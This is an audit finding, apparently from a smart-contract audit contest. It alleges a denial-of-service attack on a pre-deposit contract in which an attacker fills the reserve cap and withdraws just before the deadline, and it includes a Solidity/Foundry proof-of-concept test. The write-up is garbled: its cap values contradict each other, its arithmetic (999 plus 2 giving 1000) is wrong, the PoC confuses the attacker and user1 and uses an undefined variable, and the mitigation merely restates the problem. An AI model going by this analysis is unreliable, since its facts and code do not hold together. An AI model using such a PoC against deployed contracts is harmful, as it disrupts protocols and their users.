# The Dos attack in predeposit contract.

Summary
There is validation for depositing limitation per users.
the attacker can deposit reserveCap  amount by more than twice depositing.
In this case, the another cannot deposit.
before the endtime, withdraw all.It makes nobody can create pool.

Root Cause
For example,
if reserveCap  is 1000, the attacker deposits 999 and deposits 2 again.
so the balance of attacker is 1000 and reserveAmount becomes 1000.
nobody can deposit.
just before end time, withdraw all. it makes reserveAmount  as 0.

Attack Path
For example,
if reserveCap  is 100, the attacker deposits 999 and deposits 2 again.
so the balance of attacker is 1000 and reserveAmount becomes 1000.
nobody can deposit.
just before end time, withdraw all. it makes reserveAmount  as 0.

Impact
The attacker can prevent the creation of the pool, effectively disrupting the protocol's intended functionality(DOS).
Honest participants are unable to contribute to the pool because the reserve cap is monopolized by the attacker.
Such behavior can erode user trust in the protocol, as the system appears susceptible to manipulation.

PoC
```solidity
function testDoSAttackViaExcessiveDeposits() public {
    uint256 reserveCap = 100 ether;
    uint256 attackerDeposit1 = 999 ether;
    uint256 attackerDeposit2 = 2 ether;
    uint256 userDeposit = 100 ether;

    // Adjust the reserve cap for the test
    vm.startPrank(governance);
    preDeposit.increaseReserveCap(reserveCap);
    vm.stopPrank();

    // Attacker makes the first deposit of 99 ETH
    vm.startPrank(attacker); // user1 is the attacker
    reserveToken.approve(address(preDeposit), attackerDeposit1);
    preDeposit.deposit(attackerDeposit1);
    vm.stopPrank();
    vm.startPrank(user1);
    reserveToken.approve(address(preDeposit), attackerDeposit2);
    preDeposit.deposit(attackerDeposit2);
    assertEq(preDeposit.balances(user1), reserveCap, "Attacker's total balance mismatch");
    assertEq(preDeposit.reserveAmount(), reserveCap, "Reserve amount after second deposit mismatch");
    vm.stopPrank();
    vm.startPrank(user1);
    reserveToken.approve(address(preDeposit), userDeposit );
    vm.expectRevert(PreDeposit.DepositCapReached.selector);
    preDeposit.deposit(depositAmount);
    vm.stopPrank();
    vm.warp(preDeposit.depositEndTime() - 1);
    vm.startPrank(attacker);
    preDeposit.withdraw(reserveCap);
    assertEq(preDeposit.balances(attacker), 0, "Attacker's balance after withdrawal mismatch");
    assertEq(preDeposit.reserveAmount(), 0, "Reserve amount after withdrawal mismatch");
    vm.stopPrank();
}
```
Mitigation
There is depositing limitation per users.
